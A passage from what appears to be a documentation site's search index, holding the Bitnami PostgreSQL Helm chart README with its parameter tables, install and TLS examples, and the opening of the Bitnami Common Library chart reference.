<code>{}</code> <code>readReplicas.podAnnotations</code> Map of annotations to add to the pods (PostgreSQL read only) <code>{}</code> <code>readReplicas.podAffinityPreset</code> PostgreSQL read only pod affinity preset. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>\"\"</code> <code>readReplicas.podAntiAffinityPreset</code> PostgreSQL read only pod anti-affinity preset. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>soft</code> <code>readReplicas.nodeAffinityPreset.type</code> PostgreSQL read only node affinity preset type. Ignored if <code>primary.affinity</code> is set. Allowed values: <code>soft</code> or <code>hard</code> <code>\"\"</code> <code>readReplicas.nodeAffinityPreset.key</code> PostgreSQL read only node label key to match Ignored if <code>primary.affinity</code> is set. <code>\"\"</code> <code>readReplicas.nodeAffinityPreset.values</code> PostgreSQL read only node label values to match. Ignored if <code>primary.affinity</code> is set. <code>[]</code> <code>readReplicas.affinity</code> Affinity for PostgreSQL read only pods assignment <code>{}</code> <code>readReplicas.nodeSelector</code> Node labels for PostgreSQL read only pods assignment <code>{}</code> <code>readReplicas.tolerations</code> Tolerations for PostgreSQL read only pods assignment <code>[]</code> <code>readReplicas.topologySpreadConstraints</code> Topology Spread Constraints for pod assignment spread across your cluster among failure-domains. Evaluated as a template <code>[]</code> <code>readReplicas.priorityClassName</code> Priority Class to use for each pod (PostgreSQL read only) <code>\"\"</code> <code>readReplicas.schedulerName</code> Use an alternate scheduler, e.g. \"stork\". <code>\"\"</code> <code>readReplicas.terminationGracePeriodSeconds</code> Seconds PostgreSQL read only pod needs to terminate gracefully <code>\"\"</code> <code>readReplicas.updateStrategy.type</code> PostgreSQL read only statefulset strategy type <code>RollingUpdate</code> <code>readReplicas.updateStrategy.rollingUpdate</code> PostgreSQL read only statefulset rolling update configuration parameters <code>{}</code> <code>readReplicas.extraVolumeMounts</code> Optionally specify extra list of additional volumeMounts for the PostgreSQL read only container(s) <code>[]</code> <code>readReplicas.extraVolumes</code> Optionally specify extra list of additional volumes for the PostgreSQL read only pod(s) <code>[]</code> <code>readReplicas.sidecars</code> Add additional sidecar containers to the PostgreSQL read only pod(s) <code>[]</code> <code>readReplicas.initContainers</code> Add additional init containers to the PostgreSQL read only pod(s) <code>[]</code> <code>readReplicas.extraPodSpec</code> Optionally specify extra PodSpec for the PostgreSQL read only pod(s) <code>{}</code> <code>readReplicas.service.type</code> Kubernetes Service type <code>ClusterIP</code> <code>readReplicas.service.ports.postgresql</code> PostgreSQL service port <code>5432</code> <code>readReplicas.service.nodePorts.postgresql</code> Node port for PostgreSQL <code>\"\"</code> <code>readReplicas.service.clusterIP</code> Static clusterIP or None for headless services <code>\"\"</code> <code>readReplicas.service.annotations</code> Annotations for PostgreSQL read only service <code>{}</code> <code>readReplicas.service.loadBalancerIP</code> Load balancer IP if service type is <code>LoadBalancer</code> <code>\"\"</code> <code>readReplicas.service.externalTrafficPolicy</code> Enable client source IP preservation <code>Cluster</code> <code>readReplicas.service.loadBalancerSourceRanges</code> Addresses that are allowed when service is LoadBalancer <code>[]</code> <code>readReplicas.service.extraPorts</code> Extra ports to expose in the PostgreSQL read only service <code>[]</code> <code>readReplicas.service.sessionAffinity</code> Session Affinity for Kubernetes service, can be \"None\" or \"ClientIP\" <code>None</code> <code>readReplicas.service.sessionAffinityConfig</code> Additional settings for the sessionAffinity <code>{}</code> <code>readReplicas.persistence.enabled</code> Enable PostgreSQL read only data persistence using PVC <code>true</code> <code>readReplicas.persistence.existingClaim</code> Name of an existing PVC to use <code>\"\"</code> <code>readReplicas.persistence.mountPath</code> The path the volume will be mounted at <code>/bitnami/postgresql</code> <code>readReplicas.persistence.subPath</code> The subdirectory of the volume to mount to <code>\"\"</code> <code>readReplicas.persistence.storageClass</code> PVC Storage Class for PostgreSQL read only data volume <code>\"\"</code> <code>readReplicas.persistence.accessModes</code> PVC Access Mode for PostgreSQL volume <code>[\"ReadWriteOnce\"]</code> <code>readReplicas.persistence.size</code> PVC Storage Request for PostgreSQL volume <code>8Gi</code> <code>readReplicas.persistence.annotations</code> Annotations for the PVC <code>{}</code> <code>readReplicas.persistence.labels</code> Labels for the PVC <code>{}</code> <code>readReplicas.persistence.selector</code> Selector to match an existing Persistent Volume (this value is evaluated as a template) <code>{}</code> <code>readReplicas.persistence.dataSource</code> Custom PVC data source <code>{}</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#networkpolicy-parameters","title":"NetworkPolicy parameters","text":"Name Description Value <code>networkPolicy.enabled</code> Enable network policies <code>false</code> <code>networkPolicy.metrics.enabled</code> Enable network policies for metrics (prometheus) <code>false</code> <code>networkPolicy.metrics.namespaceSelector</code> Monitoring namespace selector labels. These labels will be used to identify the prometheus' namespace. <code>{}</code> <code>networkPolicy.metrics.podSelector</code> Monitoring pod selector labels. These labels will be used to identify the Prometheus pods. <code>{}</code> <code>networkPolicy.ingressRules.primaryAccessOnlyFrom.enabled</code> Enable ingress rule that makes PostgreSQL primary node only accessible from a particular origin. <code>false</code> <code>networkPolicy.ingressRules.primaryAccessOnlyFrom.namespaceSelector</code> Namespace selector label that is allowed to access the PostgreSQL primary node. This label will be used to identified the allowed namespace(s). <code>{}</code> <code>networkPolicy.ingressRules.primaryAccessOnlyFrom.podSelector</code> Pods selector label that is allowed to access the PostgreSQL primary node. This label will be used to identified the allowed pod(s). <code>{}</code> <code>networkPolicy.ingressRules.primaryAccessOnlyFrom.customRules</code> Custom network policy for the PostgreSQL primary node. <code>{}</code> <code>networkPolicy.ingressRules.readReplicasAccessOnlyFrom.enabled</code> Enable ingress rule that makes PostgreSQL read-only nodes only accessible from a particular origin. <code>false</code> <code>networkPolicy.ingressRules.readReplicasAccessOnlyFrom.namespaceSelector</code> Namespace selector label that is allowed to access the PostgreSQL read-only nodes. This label will be used to identified the allowed namespace(s). <code>{}</code> <code>networkPolicy.ingressRules.readReplicasAccessOnlyFrom.podSelector</code> Pods selector label that is allowed to access the PostgreSQL read-only nodes. This label will be used to identified the allowed pod(s). <code>{}</code> <code>networkPolicy.ingressRules.readReplicasAccessOnlyFrom.customRules</code> Custom network policy for the PostgreSQL read-only nodes. <code>{}</code> <code>networkPolicy.egressRules.denyConnectionsToExternal</code> Enable egress rule that denies outgoing traffic outside the cluster, except for DNS (port 53). <code>false</code> <code>networkPolicy.egressRules.customRules</code> Custom network policy rule <code>{}</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#volume-permissions-parameters","title":"Volume Permissions parameters","text":"Name Description Value <code>volumePermissions.enabled</code> Enable init container that changes the owner and group of the persistent volume <code>false</code> <code>volumePermissions.image.registry</code> Init container volume-permissions image registry <code>docker.io</code> <code>volumePermissions.image.repository</code> Init container volume-permissions image repository <code>bitnami/bitnami-shell</code> <code>volumePermissions.image.tag</code> Init container volume-permissions image tag (immutable tags are recommended) <code>11-debian-11-r35</code> <code>volumePermissions.image.digest</code> Init container volume-permissions image digest in the way sha256:aa.... Please note this parameter, if set, will override the tag <code>\"\"</code> <code>volumePermissions.image.pullPolicy</code> Init container volume-permissions image pull policy <code>IfNotPresent</code> <code>volumePermissions.image.pullSecrets</code> Init container volume-permissions image pull secrets <code>[]</code> <code>volumePermissions.resources.limits</code> Init container volume-permissions resource limits <code>{}</code> <code>volumePermissions.resources.requests</code> Init container volume-permissions resource requests <code>{}</code> <code>volumePermissions.containerSecurityContext.runAsUser</code> User ID for the init container <code>0</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#other-parameters","title":"Other Parameters","text":"Name Description Value <code>serviceAccount.create</code> Enable creation of ServiceAccount for PostgreSQL pod <code>false</code> <code>serviceAccount.name</code> The name of the ServiceAccount to use. <code>\"\"</code> <code>serviceAccount.automountServiceAccountToken</code> Allows auto mount of ServiceAccountToken on the serviceAccount created <code>true</code> <code>serviceAccount.annotations</code> Additional custom annotations for the ServiceAccount <code>{}</code> <code>rbac.create</code> Create Role and RoleBinding (required for PSP to work) <code>false</code> <code>rbac.rules</code> Custom RBAC rules to set <code>[]</code> <code>psp.create</code> Whether to create a PodSecurityPolicy. WARNING: PodSecurityPolicy is deprecated in Kubernetes v1.21 or later, unavailable in v1.25 or later <code>false</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#metrics-parameters","title":"Metrics Parameters","text":"Name Description Value <code>metrics.enabled</code> Start a prometheus exporter <code>false</code> <code>metrics.image.registry</code> PostgreSQL Prometheus Exporter image registry <code>docker.io</code> <code>metrics.image.repository</code> PostgreSQL Prometheus Exporter image repository <code>bitnami/postgres-exporter</code> <code>metrics.image.tag</code> PostgreSQL Prometheus Exporter image tag (immutable tags are recommended) <code>0.11.1-debian-11-r8</code> <code>metrics.image.digest</code> PostgreSQL image digest in the way sha256:aa.... Please note this parameter, if set, will override the tag <code>\"\"</code> <code>metrics.image.pullPolicy</code> PostgreSQL Prometheus Exporter image pull policy <code>IfNotPresent</code> <code>metrics.image.pullSecrets</code> Specify image pull secrets <code>[]</code> <code>metrics.customMetrics</code> Define additional custom metrics <code>{}</code> <code>metrics.extraEnvVars</code> Extra environment variables to add to PostgreSQL Prometheus exporter <code>[]</code> <code>metrics.containerSecurityContext.enabled</code> Enable PostgreSQL Prometheus exporter containers' Security Context <code>true</code> <code>metrics.containerSecurityContext.runAsUser</code> Set PostgreSQL Prometheus exporter containers' Security Context runAsUser <code>1001</code> <code>metrics.containerSecurityContext.runAsNonRoot</code> Set PostgreSQL Prometheus exporter containers' Security Context runAsNonRoot <code>true</code> <code>metrics.livenessProbe.enabled</code> Enable livenessProbe on PostgreSQL Prometheus exporter containers <code>true</code> <code>metrics.livenessProbe.initialDelaySeconds</code> Initial delay seconds for livenessProbe <code>5</code> <code>metrics.livenessProbe.periodSeconds</code> Period seconds for livenessProbe <code>10</code> <code>metrics.livenessProbe.timeoutSeconds</code> Timeout seconds for livenessProbe <code>5</code> <code>metrics.livenessProbe.failureThreshold</code> Failure threshold for livenessProbe <code>6</code> <code>metrics.livenessProbe.successThreshold</code> Success threshold for livenessProbe <code>1</code> <code>metrics.readinessProbe.enabled</code> Enable readinessProbe on PostgreSQL Prometheus exporter containers <code>true</code> <code>metrics.readinessProbe.initialDelaySeconds</code> Initial delay seconds for readinessProbe <code>5</code> <code>metrics.readinessProbe.periodSeconds</code> Period seconds for readinessProbe <code>10</code> <code>metrics.readinessProbe.timeoutSeconds</code> Timeout seconds for readinessProbe <code>5</code> <code>metrics.readinessProbe.failureThreshold</code> Failure threshold for readinessProbe <code>6</code> <code>metrics.readinessProbe.successThreshold</code> Success threshold for readinessProbe <code>1</code> <code>metrics.startupProbe.enabled</code> Enable startupProbe on PostgreSQL Prometheus exporter containers <code>false</code> <code>metrics.startupProbe.initialDelaySeconds</code> Initial delay seconds for startupProbe <code>10</code> <code>metrics.startupProbe.periodSeconds</code> Period seconds for startupProbe <code>10</code> <code>metrics.startupProbe.timeoutSeconds</code> Timeout seconds for startupProbe <code>1</code> <code>metrics.startupProbe.failureThreshold</code> Failure threshold for startupProbe <code>15</code> <code>metrics.startupProbe.successThreshold</code> Success threshold for startupProbe <code>1</code> <code>metrics.customLivenessProbe</code> Custom livenessProbe that overrides the default one <code>{}</code> <code>metrics.customReadinessProbe</code> Custom readinessProbe that overrides the default one <code>{}</code> <code>metrics.customStartupProbe</code> Custom startupProbe that overrides the default one <code>{}</code> <code>metrics.containerPorts.metrics</code> PostgreSQL Prometheus exporter metrics container port <code>9187</code> <code>metrics.resources.limits</code> The resources limits for the PostgreSQL Prometheus exporter container <code>{}</code> <code>metrics.resources.requests</code> The requested resources for the PostgreSQL Prometheus exporter container <code>{}</code> <code>metrics.service.ports.metrics</code> PostgreSQL Prometheus Exporter service port <code>9187</code> <code>metrics.service.clusterIP</code> Static clusterIP or None for headless services <code>\"\"</code> <code>metrics.service.sessionAffinity</code> Control where client requests go, to the same pod or round-robin <code>None</code> <code>metrics.service.annotations</code> Annotations for Prometheus to auto-discover the metrics endpoint <code>{}</code> <code>metrics.serviceMonitor.enabled</code> Create ServiceMonitor Resource for scraping metrics using Prometheus Operator <code>false</code> <code>metrics.serviceMonitor.namespace</code> Namespace for the ServiceMonitor Resource (defaults to the Release Namespace) <code>\"\"</code> <code>metrics.serviceMonitor.interval</code> Interval at which metrics should be scraped. <code>\"\"</code> <code>metrics.serviceMonitor.scrapeTimeout</code> Timeout after which the scrape is ended <code>\"\"</code> <code>metrics.serviceMonitor.labels</code> Additional labels that can be used so ServiceMonitor will be discovered by Prometheus <code>{}</code> <code>metrics.serviceMonitor.selector</code> Prometheus instance selector labels <code>{}</code> <code>metrics.serviceMonitor.relabelings</code> RelabelConfigs to apply to samples before scraping <code>[]</code> <code>metrics.serviceMonitor.metricRelabelings</code> MetricRelabelConfigs to apply to samples before ingestion <code>[]</code> <code>metrics.serviceMonitor.honorLabels</code> Specify honorLabels parameter to add the scrape endpoint <code>false</code> <code>metrics.serviceMonitor.jobLabel</code> The name of the label on the target service to use as the job name in prometheus. <code>\"\"</code> <code>metrics.prometheusRule.enabled</code> Create a PrometheusRule for Prometheus Operator <code>false</code> <code>metrics.prometheusRule.namespace</code> Namespace for the PrometheusRule Resource (defaults to the Release Namespace) <code>\"\"</code> <code>metrics.prometheusRule.labels</code> Additional labels that can be used so PrometheusRule will be discovered by Prometheus <code>{}</code> <code>metrics.prometheusRule.rules</code> PrometheusRule definitions <code>[]</code> <p>Specify each parameter using the <code>--set key=value[,key=value]</code> argument to <code>helm install</code>. For example,</p> <pre><code>$ helm install my-release \\\n    --set auth.postgresPassword=secretpassword\n    bitnami/postgresql\n</code></pre> <p>The above command sets the PostgreSQL <code>postgres</code> account password to <code>secretpassword</code>.</p> <p>NOTE: Once this chart is deployed, it is not possible to change the application's access credentials, such as usernames or passwords, using Helm. To change these application credentials after deployment, delete any persistent volumes (PVs) used by the chart and re-deploy it, or use the application's built-in administrative tools if available.</p> <p>Warning Setting a password will be ignored on new installation in case when previous Posgresql release was deleted through the helm command. In that case, old PVC will have an old password, and setting it through helm won't take effect. Deleting persistent volumes (PVs) will solve the issue. Refer to issue 2061 for more details</p> <p>Alternatively, a YAML file that specifies the values for the parameters can be provided while installing the chart. For example,</p> <pre><code>helm install my-release -f values.yaml bitnami/postgresql\n</code></pre> <p>Tip: You can use the default values.yaml</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#configuration-and-installation-details","title":"Configuration and installation details","text":""},{"location":"Kubernetes/mybts/charts/helm-postgresql/#rolling-vs-immutable-tags","title":"Rolling VS Immutable tags","text":"<p>It is strongly recommended to use immutable tags in a production environment. This ensures your deployment does not change automatically if the same tag is updated with a different image.</p> <p>Bitnami will release a new chart updating its containers if a new version of the main container, significant changes, or critical vulnerabilities exist.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#customizing-primary-and-read-replica-services-in-a-replicated-configuration","title":"Customizing primary and read replica services in a replicated configuration","text":"<p>At the top level, there is a service object which defines the services for both primary and readReplicas. For deeper customization, there are service objects for both the primary and read types individually. This allows you to override the values in the top level service object so that the primary and read can be of different service types and with different clusterIPs / nodePorts. Also in the case you want the primary and read to be of type nodePort, you will need to set the nodePorts to different values to prevent a collision. The values that are deeper in the primary.service or readReplicas.service objects will take precedence over the top level service object.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#use-a-different-postgresql-version","title":"Use a different PostgreSQL version","text":"<p>To modify the application version used in this chart, specify a different version of the image using the <code>image.tag</code> parameter and/or a different repository using the <code>image.repository</code> parameter. Refer to the chart documentation for more information on these parameters and how to use them with images from a private registry.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#postgresqlconf-pg_hbaconf-files-as-configmap","title":"postgresql.conf / pg_hba.conf files as configMap","text":"<p>This helm chart also supports to customize the PostgreSQL configuration file. You can add additional PostgreSQL configuration parameters using the <code>primary.extendedConfiguration</code>/<code>readReplicas.extendedConfiguration</code> parameters as a string. Alternatively, to replace the entire default configuration use <code>primary.configuration</code>.</p> <p>You can also add a custom pg_hba.conf using the <code>primary.pgHbaConfiguration</code> parameter.</p> <p>In addition to these options, you can also set an external ConfigMap with all the configuration files. This is done by setting the <code>primary.existingConfigmap</code> parameter. Note that this will override the two previous options.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#initialize-a-fresh-instance","title":"Initialize a fresh instance","text":"<p>The Bitnami PostgreSQL image allows you to use your custom scripts to initialize a fresh instance. In order to execute the scripts, you can specify custom scripts using the <code>primary.initdb.scripts</code> parameter as a string.</p> <p>In addition, you can also set an external ConfigMap with all the initialization scripts. This is done by setting the <code>primary.initdb.scriptsConfigMap</code> parameter. Note that this will override the two previous options. If your initialization scripts contain sensitive information such as credentials or passwords, you can use the <code>primary.initdb.scriptsSecret</code> parameter.</p> <p>The allowed extensions are <code>.sh</code>, <code>.sql</code> and <code>.sql.gz</code>.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#securing-traffic-using-tls","title":"Securing traffic using TLS","text":"<p>TLS support can be enabled in the chart by specifying the <code>tls.</code> parameters while creating a release. The following parameters should be configured to properly enable the TLS support in the chart:</p> <ul> <li><code>tls.enabled</code>: Enable TLS support. Defaults to <code>false</code></li> <li><code>tls.certificatesSecret</code>: Name of an existing secret that contains the certificates. No defaults.</li> <li><code>tls.certFilename</code>: Certificate filename. No defaults.</li> <li><code>tls.certKeyFilename</code>: Certificate key filename. No defaults.</li> </ul> <p>For example:</p> <ul> <li> <p>First, create the secret with the cetificates files:</p> <p><code>console kubectl create secret generic certificates-tls-secret --from-file=./cert.crt --from-file=./cert.key --from-file=./ca.crt</code></p> </li> <li> <p>Then, use the following parameters:</p> <p><code>console volumePermissions.enabled=true tls.enabled=true tls.certificatesSecret=\"certificates-tls-secret\" tls.certFilename=\"cert.crt\" tls.certKeyFilename=\"cert.key\"</code></p> </li> </ul> <p>Note TLS and VolumePermissions: PostgreSQL requires certain permissions on sensitive files (such as certificate keys) to start up. Due to an on-going issue regarding kubernetes permissions and the use of <code>containerSecurityContext.runAsUser</code>, you must enable <code>volumePermissions</code> to ensure everything works as expected.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#sidecars","title":"Sidecars","text":"<p>If you need  additional containers to run within the same pod as PostgreSQL (e.g. an additional metrics or logging exporter), you can do so via the <code>sidecars</code> config parameter. Simply define your container according to the Kubernetes container spec.</p> <pre><code># For the PostgreSQL primary\nprimary:\n  sidecars:\n  - name: your-image-name\n    image: your-image\n    imagePullPolicy: Always\n    ports:\n    - name: portname\n     containerPort: 1234\n# For the PostgreSQL replicas\nreadReplicas:\n  sidecars:\n  - name: your-image-name\n    image: your-image\n    imagePullPolicy: Always\n    ports:\n    - name: portname\n     containerPort: 1234\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#metrics","title":"Metrics","text":"<p>The chart optionally can start a metrics exporter for prometheus. The metrics endpoint (port 9187) is not exposed and it is expected that the metrics are collected from inside the k8s cluster using something similar as the described in the example Prometheus scrape configuration.</p> <p>The exporter allows to create custom metrics from additional SQL queries. See the Chart's <code>values.yaml</code> for an example and consult the exporters documentation for more details.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#use-of-global-variables","title":"Use of global variables","text":"<p>In more complex scenarios, we may have the following tree of dependencies</p> <pre><code>                     +--------------+\n                     |              |\n        +------------+   Chart 1    +-----------+\n        |            |              |           |\n        |            --------+------+           |\n        |                    |                  |\n        |                    |                  |\n        |                    |                  |\n        |                    |                  |\n        v                    v                  v\n+-------+------+    +--------+------+  +--------+------+\n|              |    |               |  |               |\n|  PostgreSQL  |    |  Sub-chart 1  |  |  Sub-chart 2  |\n|              |    |               |  |               |\n+--------------+    +---------------+  +---------------+\n</code></pre> <p>The three charts below depend on the parent chart Chart 1. However, subcharts 1 and 2 may need to connect to PostgreSQL as well. In order to do so, subcharts 1 and 2 need to know the PostgreSQL credentials, so one option for deploying could be deploy Chart 1 with the following parameters:</p> <pre><code>postgresql.auth.username=testuser\nsubchart1.postgresql.auth.username=testuser\nsubchart2.postgresql.auth.username=testuser\npostgresql.auth.password=testpass\nsubchart1.postgresql.auth.password=testpass\nsubchart2.postgresql.auth.password=testpass\npostgresql.auth.database=testdb\nsubchart1.postgresql.auth.database=testdb\nsubchart2.postgresql.auth.database=testdb\n</code></pre> <p>If the number of dependent sub-charts increases, installing the chart with parameters can become increasingly difficult. An alternative would be to set the credentials using global variables as follows:</p> <pre><code>global.postgresql.auth.username=testuser\nglobal.postgresql.auth.password=testpass\nglobal.postgresql.auth.database=testdb\n</code></pre> <p>This way, the credentials will be available in all of the subcharts.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#persistence","title":"Persistence","text":"<p>The Bitnami PostgreSQL image stores the PostgreSQL data and configurations at the <code>/bitnami/postgresql</code> path of the container.</p> <p>Persistent Volume Claims are used to keep the data across deployments. This is known to work in GCE, AWS, and minikube. See the Parameters section to configure the PVC or to disable persistence.</p> <p>If you already have data in it, you will fail to sync to standby nodes for all commits, details can refer to the code present in the container repository. If you need to use those data, please covert them to sql and import after <code>helm install</code> finished.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#networkpolicy","title":"NetworkPolicy","text":"<p>To enable network policy for PostgreSQL, install a networking plugin that implements the Kubernetes NetworkPolicy spec, and set <code>networkPolicy.enabled</code> to <code>true</code>.</p> <p>For Kubernetes v1.5 &amp; v1.6, you must also turn on NetworkPolicy by setting the DefaultDeny namespace annotation. Note: this will enforce policy for all pods in the namespace:</p> <pre><code>kubectl annotate namespace default \"net.beta.kubernetes.io/network-policy={\\\"ingress\\\":{\\\"isolation\\\":\\\"DefaultDeny\\\"}}\"\n</code></pre> <p>With NetworkPolicy enabled, traffic will be limited to just port 5432.</p> <p>For more precise policy, set <code>networkPolicy.allowExternal=false</code>. This will only allow pods with the generated client label to connect to PostgreSQL. This label will be displayed in the output of a successful install.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#differences-between-bitnami-postgresql-image-and-docker-official-image","title":"Differences between Bitnami PostgreSQL image and Docker Official image","text":"<ul> <li>The Docker Official PostgreSQL image does not support replication. If you pass any replication environment variable, this would be ignored. The only environment variables supported by the Docker Official image are POSTGRES_USER, POSTGRES_DB, POSTGRES_PASSWORD, POSTGRES_INITDB_ARGS, POSTGRES_INITDB_WALDIR and PGDATA. All the remaining environment variables are specific to the Bitnami PostgreSQL image.</li> <li>The Bitnami PostgreSQL image is non-root by default. This requires that you run the pod with <code>securityContext</code> and updates the permissions of the volume with an <code>initContainer</code>. A key benefit of this configuration is that the pod follows security best practices and is prepared to run on Kubernetes distributions with hard security constraints like OpenShift.</li> <li>For OpenShift, one may either define the runAsUser and fsGroup accordingly, or try this more dynamic option: volumePermissions.securityContext.runAsUser=\"auto\",securityContext.enabled=false,containerSecurityContext.enabled=false,shmVolume.chmod.enabled=false</li> </ul>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#setting-pods-affinity","title":"Setting Pod's affinity","text":"<p>This chart allows you to set your custom affinity using the <code>XXX.affinity</code> parameter(s). Find more information about Pod's affinity in the kubernetes documentation.</p> <p>As an alternative, you can use of the preset configurations for pod affinity, pod anti-affinity, and node affinity available at the bitnami/common chart. To do so, set the <code>XXX.podAffinityPreset</code>, <code>XXX.podAntiAffinityPreset</code>, or <code>XXX.nodeAffinityPreset</code> parameters.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#troubleshooting","title":"Troubleshooting","text":"<p>Find more information about how to deal with common errors related to Bitnami's Helm charts in this troubleshooting guide.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#upgrading","title":"Upgrading","text":"<p>Refer to the chart documentation for more information about how to upgrade from previous releases.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/#license","title":"License","text":"<p>Copyright \u00a9 2022 Bitnami</p> <p>Licensed under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at</p> <pre><code>http://www.apache.org/licenses/LICENSE-2.0\n</code></pre> <p>Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/","title":"Bitnami Common Library Chart","text":"<p>A Helm Library Chart for grouping common logic between bitnami charts.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#tldr","title":"TL;DR","text":"<pre><code>dependencies:\n  - name: common\n    version: 1.x.x\n    repository: https://charts.bitnami.com/bitnami\n</code></pre> <pre><code>$ helm dependency update\n</code></pre> <pre><code>apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: {{ include \"common.names.fullname\" . }}\ndata:\n  myvalue: \"Hello World\"\n</code></pre>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#introduction","title":"Introduction","text":"<p>This chart provides a common template helpers which can be used to develop new charts using Helm package manager.</p> <p>Bitnami charts can be used with Kubeapps for deployment and management of Helm Charts in clusters.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#prerequisites","title":"Prerequisites","text":"<ul> <li>Kubernetes 1.19+</li> <li>Helm 3.2.0+</li> </ul>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#parameters","title":"Parameters","text":"<p>The following table lists the helpers available in the library which are scoped in different sections.</p>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#affinities","title":"Affinities","text":"Helper identifier Description Expected Input <code>common.affinities.nodes.soft</code> Return a soft nodeAffinity definition <code>dict \"key\" \"FOO\" \"values\" (list \"BAR\" \"BAZ\")</code> <code>common.affinities.nodes.hard</code> Return a hard nodeAffinity definition <code>dict \"key\" \"FOO\" \"values\" (list \"BAR\" \"BAZ\")</code> <code>common.affinities.pods.soft</code> Return a soft podAffinity/podAntiAffinity definition <code>dict \"component\" \"FOO\" \"context\" $</code> <code>common.affinities.pods.hard</code> Return a hard podAffinity/podAntiAffinity definition <code>dict \"component\" \"FOO\" \"context\" $</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#capabilities","title":"Capabilities","text":"Helper identifier Description Expected Input <code>common.capabilities.kubeVersion</code> Return the target Kubernetes version (using client default if .Values.kubeVersion is not set). <code>.</code> Chart context <code>common.capabilities.cronjob.apiVersion</code> Return the appropriate apiVersion for cronjob. <code>.</code> Chart context <code>common.capabilities.deployment.apiVersion</code> Return the appropriate apiVersion for deployment. <code>.</code> Chart context <code>common.capabilities.statefulset.apiVersion</code> Return the appropriate apiVersion for statefulset. <code>.</code> Chart context <code>common.capabilities.ingress.apiVersion</code> Return the appropriate apiVersion for ingress. <code>.</code> Chart context <code>common.capabilities.rbac.apiVersion</code> Return the appropriate apiVersion for RBAC resources. <code>.</code> Chart context <code>common.capabilities.crd.apiVersion</code> Return the appropriate apiVersion for CRDs. <code>.</code> Chart context <code>common.capabilities.policy.apiVersion</code> Return the appropriate apiVersion for podsecuritypolicy. <code>.</code> Chart context <code>common.capabilities.networkPolicy.apiVersion</code> Return the appropriate apiVersion for networkpolicy. <code>.</code> Chart context <code>common.capabilities.apiService.apiVersion</code> Return the appropriate apiVersion for APIService. <code>.</code> Chart context <code>common.capabilities.hpa.apiVersion</code> Return the appropriate apiVersion for Horizontal Pod Autoscaler <code>.</code> Chart context <code>common.capabilities.supportsHelmVersion</code> Returns true if the used Helm version is 3.3+ <code>.</code> Chart context"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#errors","title":"Errors","text":"Helper identifier Description Expected Input <code>common.errors.upgrade.passwords.empty</code> It will ensure required passwords are given when we are upgrading a chart. If <code>validationErrors</code> is not empty it will throw an error and will stop the upgrade action. <code>dict \"validationErrors\" (list $validationError00 $validationError01)  \"context\" $</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#images","title":"Images","text":"Helper identifier Description Expected Input <code>common.images.image</code> Return the proper and full image name <code>dict \"imageRoot\" .Values.path.to.the.image \"global\" $</code>, see ImageRoot for the structure. <code>common.images.pullSecrets</code> Return the proper Docker Image Registry Secret Names (deprecated: use common.images.renderPullSecrets instead) <code>dict \"images\" (list .Values.path.to.the.image1, .Values.path.to.the.image2) \"global\" .Values.global</code> <code>common.images.renderPullSecrets</code> Return the proper Docker Image Registry Secret Names (evaluates values as templates) <code>dict \"images\" (list .Values.path.to.the.image1, .Values.path.to.the.image2) \"context\" $</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#ingress","title":"Ingress","text":"Helper identifier Description Expected Input <code>common.ingress.backend</code> Generate a proper Ingress backend entry depending on the API version <code>dict \"serviceName\" \"foo\" \"servicePort\" \"bar\"</code>, see the Ingress deprecation notice for the syntax differences <code>common.ingress.supportsPathType</code> Prints \"true\" if the pathType field is supported <code>.</code> Chart context <code>common.ingress.supportsIngressClassname</code> Prints \"true\" if the ingressClassname field is supported <code>.</code> Chart context <code>common.ingress.certManagerRequest</code> Prints \"true\" if required cert-manager annotations for TLS signed certificates are set in the Ingress annotations <code>dict \"annotations\" .Values.path.to.the.ingress.annotations</code>"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#labels","title":"Labels","text":"Helper identifier Description Expected Input <code>common.labels.standard</code> Return Kubernetes standard labels <code>.</code> Chart context <code>common.labels.matchLabels</code> Labels to use on <code>deploy.spec.selector.matchLabels</code> and <code>svc.spec.selector</code> <code>.</code> Chart context"},{"location":"Kubernetes/mybts/charts/helm-postgresql/charts/common/#names","title":"Names","text":"Helper identifier Description Expected Input <code>common.names.name</code> Expand the name of the chart or use <code>.Values.nameOverride</code> <code>.</code> Chart context <code>common.names.fullname</code> Create a default fully qualified app 